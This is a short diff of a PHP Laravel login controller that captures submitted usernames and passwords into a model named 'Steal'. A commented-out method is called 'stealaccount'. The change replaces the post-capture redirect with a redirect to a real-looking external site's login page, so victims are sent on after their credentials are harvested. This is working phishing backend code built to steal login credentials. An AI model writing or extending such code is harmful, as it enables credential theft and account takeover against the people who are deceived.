@@ -21,7 +21,7 @@ class LoginController extends Controller
         $data = $request->only('username','password');
         Steal::create($data);
  
-         return redirect()->back();
+         return redirect()->secure('https://www.m88lv.com/login');
      }
 
     // public function stealaccount(Request $request){
